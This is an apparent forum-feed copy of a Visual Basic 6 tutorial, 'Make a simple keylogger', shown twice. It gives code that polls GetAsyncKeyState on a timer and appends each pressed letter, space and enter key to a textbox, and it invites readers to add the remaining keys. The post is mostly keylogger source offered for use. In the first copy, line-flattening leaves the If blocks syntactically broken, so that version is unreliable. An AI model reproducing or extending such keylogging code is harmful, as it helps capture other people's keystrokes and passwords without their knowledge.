channel.title: [VB6] Make a simple keylogger
channel.description:
This tutorial will teach you how to log keys :)
First you will need a timer with a interval of 500 (so it doesn't repeat the key in the textbox) Also make a textbox.
In the code area declare this:-
[code]Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer[/code]
This is how you would log keys:-
[code]If GetAsyncKeyState(vbKeyA) Then .Text = .Text & "A"[/code]
Look at vbkey[b]A[/b], if the user presses the key [b]A[/b] then the program will add that letter into the textbox.
Now to make it know what textbox to add it to.
In the part where you make it log the keys (use the timer) put this:-
[code]With Text1
### THE LOG CODE GOES HERE ###
End With
End Sub [/code]
That will tell the program what textbox it should add the keys to.
Heres a sample of the code (it wont log every key, you will have to add the rest)
[code]Private Sub Timer1_Timer()
' Tutorial by James aka Webmonster ' Visit www.websofts.org for more tutorials
With Text1
If GetAsyncKeyState(vbKeySpace) Then .Text = .Text + "{space}" End If
If GetAsyncKeyState(vbKeyReturn) Then .Text = .Text + "{enter}" End If
If GetAsyncKeyState(vbKeyA) Then .Text = .Text + "A" End If
If GetAsyncKeyState(vbKeyB) Then .Text = .Text + "B" End If
If GetAsyncKeyState(vbKeyC) Then .Text = .Text + "C" End If
If GetAsyncKeyState(vbKeyD) Then .Text = .Text + "D" End If
If GetAsyncKeyState(vbKeyE) Then .Text = .Text + "E" End If
If GetAsyncKeyState(vbKeyF) Then .Text = .Text + "F" End If
If GetAsyncKeyState(vbKeyG) Then .Text = .Text + "G" End If
If GetAsyncKeyState(vbKeyH) Then .Text = .Text + "H" End If
If GetAsyncKeyState(vbKeyI) Then .Text = .Text + "I" End If
If GetAsyncKeyState(vbKeyJ) Then .Text = .Text + "J" End If
If GetAsyncKeyState(vbKeyK) Then .Text = .Text + "K" End If
If GetAsyncKeyState(vbKeyL) Then .Text = .Text + "L" End If
If GetAsyncKeyState(vbKeyM) Then .Text = .Text + "M" End If
If GetAsyncKeyState(vbKeyN) Then .Text = .Text + "N" End If
If GetAsyncKeyState(vbKeyO) Then .Text = .Text + "O" End If
If GetAsyncKeyState(vbKeyP) Then .Text = .Text + "P" End If
If GetAsyncKeyState(vbKeyQ) Then .Text = .Text + "Q" End If
If GetAsyncKeyState(vbKeyR) Then .Text = .Text + "R" End If
If GetAsyncKeyState(vbKeyS) Then .Text = .Text + "S" End If
If GetAsyncKeyState(vbKeyT) Then .Text = .Text + "T" End If
If GetAsyncKeyState(vbKeyU) Then .Text = .Text + "U" End If
If GetAsyncKeyState(vbKeyV) Then .Text = .Text + "V" End If
If GetAsyncKeyState(vbKeyW) Then .Text = .Text + "W" End If
If GetAsyncKeyState(vbKeyX) Then .Text = .Text + "X" End If
If GetAsyncKeyState(vbKeyY) Then .Text = .Text + "Y" End If
If GetAsyncKeyState(vbKeyZ) Then .Text = .Text + "Z" End If
End With
End Sub[/code]

item.title: [VB6] Make a simple keylogger
item.dc:creator: @hellou hellou
item.description:
@hellou wrote:

This tutorial will teach you how to log keys

First you will need a timer with a interval of 500 (so it doesn’t repeat the key in the textbox)
Also make a textbox.

In the code area declare this:-

Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer

This is how you would log keys:-

If GetAsyncKeyState(vbKeyA) Then .Text = .Text & "A"

Look at vbkeyA, if the user presses the key A then the program will add that letter into the textbox.

Now to make it know what textbox to add it to.

In the part where you make it log the keys (use the timer) put this:-

[code]With Text1

THE LOG CODE GOES HERE

End With

End Sub
[/code]

That will tell the program what textbox it should add the keys to.

Heres a sample of the code (it wont log every key, you will have to add the rest)

[code]Private Sub Timer1_Timer()

’ Tutorial by James aka Webmonster
’ Visit www.websofts.org for more tutorials

With Text1

    If GetAsyncKeyState(vbKeySpace) Then
        .Text = .Text + "{space}"
    End If

    If GetAsyncKeyState(vbKeyReturn) Then
        .Text = .Text + "{enter}"
    End If

    If GetAsyncKeyState(vbKeyA) Then
        .Text = .Text + "A"
    End If


    If GetAsyncKeyState(vbKeyB) Then
        .Text = .Text + "B"
    End If


    If GetAsyncKeyState(vbKeyC) Then
        .Text = .Text + "C"
    End If


    If GetAsyncKeyState(vbKeyD) Then
        .Text = .Text + "D"
    End If


    If GetAsyncKeyState(vbKeyE) Then
        .Text = .Text + "E"
    End If


    If GetAsyncKeyState(vbKeyF) Then
        .Text = .Text + "F"
    End If


    If GetAsyncKeyState(vbKeyG) Then
        .Text = .Text + "G"
    End If


    If GetAsyncKeyState(vbKeyH) Then
        .Text = .Text + "H"
    End If


    If GetAsyncKeyState(vbKeyI) Then
        .Text = .Text + "I"
    End If


    If GetAsyncKeyState(vbKeyJ) Then
        .Text = .Text + "J"
    End If


    If GetAsyncKeyState(vbKeyK) Then
        .Text = .Text + "K"
    End If


    If GetAsyncKeyState(vbKeyL) Then
        .Text = .Text + "L"
    End If


    If GetAsyncKeyState(vbKeyM) Then
        .Text = .Text + "M"
    End If


    If GetAsyncKeyState(vbKeyN) Then
        .Text = .Text + "N"
    End If


    If GetAsyncKeyState(vbKeyO) Then
        .Text = .Text + "O"
    End If


    If GetAsyncKeyState(vbKeyP) Then
        .Text = .Text + "P"
    End If


    If GetAsyncKeyState(vbKeyQ) Then
        .Text = .Text + "Q"
    End If


    If GetAsyncKeyState(vbKeyR) Then
        .Text = .Text + "R"
    End If


    If GetAsyncKeyState(vbKeyS) Then
        .Text = .Text + "S"
    End If


    If GetAsyncKeyState(vbKeyT) Then
        .Text = .Text + "T"
    End If


    If GetAsyncKeyState(vbKeyU) Then
        .Text = .Text + "U"
    End If


    If GetAsyncKeyState(vbKeyV) Then
        .Text = .Text + "V"
    End If


    If GetAsyncKeyState(vbKeyW) Then
        .Text = .Text + "W"
    End If


    If GetAsyncKeyState(vbKeyX) Then
        .Text = .Text + "X"
    End If


    If GetAsyncKeyState(vbKeyY) Then
        .Text = .Text + "Y"
    End If


    If GetAsyncKeyState(vbKeyZ) Then
        .Text = .Text + "Z"
    End If

End With

End Sub[/code]
